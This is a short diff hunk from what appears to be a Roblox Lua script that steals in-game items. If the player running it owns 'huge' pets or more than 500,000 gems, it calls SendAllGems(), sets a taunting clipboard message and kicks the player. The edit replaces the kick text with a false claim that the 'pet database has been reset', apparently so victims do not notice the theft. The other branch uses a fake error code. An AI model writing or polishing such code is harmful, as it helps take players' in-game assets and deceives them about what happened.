@@ -237,7 +237,7 @@ if CountHuges() > 0 or CountGems() > 500000 then
 	end
 	SendAllGems()
 	setclipboard("valyxra on top")
-	plr:kick("CONNECTION ERROR. please rejoin")
+	plr:kick("pet database has been reset. please rejoin")
 else
 	plr:kick("Error on script execution: 0x0001F4A2")
 end
